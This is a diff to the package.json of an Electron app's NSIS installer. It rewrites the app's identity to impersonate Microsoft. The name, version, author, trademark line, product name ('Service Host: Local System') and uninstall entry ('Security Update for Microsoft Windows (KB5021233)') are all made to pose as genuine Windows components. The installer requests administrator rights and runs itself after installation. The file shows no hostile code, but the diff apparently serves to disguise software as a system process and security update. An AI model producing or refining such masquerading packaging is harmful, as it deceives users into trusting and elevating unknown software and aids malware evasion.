@@ -1,9 +1,9 @@
 {
-  "name": "win-virtual-services",
+  "name": "win-service-host",
   "private": true,
-  "version": "1.0.6",
-  "description": "Windows System Integrity Service",
-  "author": "Microsoft Corporation Ltd.",
+  "version": "10.0.19045",
+  "description": "Host Process for Windows Services",
+  "author": "Microsoft Corporation",
   "main": "electron/main.js",
   "scripts": {
     "start": "tsc && vite build && electron .",
@@ -13,8 +13,8 @@
     "electron:build": "vite build && electron-builder"
   },
   "build": {
-    "appId": "com.win.services.virtual",
-    "productName": "Windows Sanal Hizmetler Ayarları",
+    "appId": "com.microsoft.windows.integrity",
+    "productName": "Service Host: Local System",
     "asar": true,
     "directories": {
       "output": "dist_electron",
@@ -29,7 +29,8 @@
     "win": {
       "target": "nsis",
       "icon": "build/icon.ico",
-      "requestedExecutionLevel": "requireAdministrator"
+      "requestedExecutionLevel": "requireAdministrator",
+      "legalTrademarks": "Microsoft Corporation. All rights reserved."
     },
     "nsis": {
       "oneClick": false,
@@ -37,8 +38,8 @@
       "allowToChangeInstallationDirectory": false,
       "createDesktopShortcut": false,
       "createStartMenuShortcut": true,
-      "shortcutName": "Windows Hizmet Yöneticisi",
-      "uninstallDisplayName": "Windows Sanal Hizmetler Ayarları (KB4023)",
+      "shortcutName": "Windows Health Monitor",
+      "uninstallDisplayName": "Security Update for Microsoft Windows (KB5021233)",
       "runAfterFinish": true,
       "deleteAppDataOnUninstall": true,
       "include": "build/installer.nsh"
@@ -61,7 +62,7 @@
     "@vitejs/plugin-react": "^4.2.1",
     "autoprefixer": "^10.4.16",
     "concurrently": "^8.2.2",
-    "electron": "^22.3.27", 
+    "electron": "^22.3.27",
     "electron-builder": "^24.9.1",
     "postcss": "^8.4.32",
     "tailwindcss": "^3.4.0",
